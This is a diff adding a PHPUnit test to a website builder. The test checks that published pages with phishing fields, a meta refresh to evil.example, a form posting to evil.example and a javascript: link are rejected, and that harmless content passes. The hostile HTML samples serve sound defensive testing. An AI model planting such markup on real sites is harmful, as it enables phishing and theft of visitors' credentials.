@@ -148,6 +148,29 @@ class BuilderTest extends TestCase
         Storage::disk('builder')->assertMissing(BuilderSite::first()->id.'/about.html');
     }
 
+    public function test_phishing_fields_redirects_and_foreign_forms_are_rejected_but_honest_text_is_fine(): void
+    {
+        $token = $this->signIn();
+        $form = $this->api($token)->postJson('/builder/forms', ['site_name' => 'Joe'])->json('form');
+        foreach ([
+            '<input type="text" name="password">',
+            '<input name="email" autocomplete="current-password">',
+            '<input name="card_number">',
+            '<input name="whatever">',
+            '<textarea name="notes"></textarea>',
+            '<meta http-equiv="Refresh " content="0;url=https://evil.example">',
+            '<meta http-equiv="content-security-policy" content="x">',
+            '<form action="https://evil.example/f/'.$form['id'].'"></form>',
+        ] as $bad) {
+            $this->publish($token, [$this->page($bad)])->assertStatus(422);
+        }
+        // Text that merely mentions JavaScript is fine, and the builder's own fields pass
+        $this->publish($token, [$this->page('<title>Learn JavaScript: build apps</title><img alt="JavaScript: the basics" src="data:image/png;base64,AAAA">'
+            .'<form method="post" action="'.$form['action'].'"><input name="name"><input name="email" type="email"><textarea name="message"></textarea><input class="hp" name="_hp"><input type="hidden" name="_back" value="x"></form>'
+            .'<input type="radio" name="tabc12" id="t1"><input type="range" min="0" max="100">')])->assertOk();
+        $this->publish($token, [$this->page('<a href=" javascript:alert(1)">x</a>')])->assertStatus(422);
+    }
+
     public function test_unsafe_html_is_rejected(): void
     {
         $token = $this->signIn();
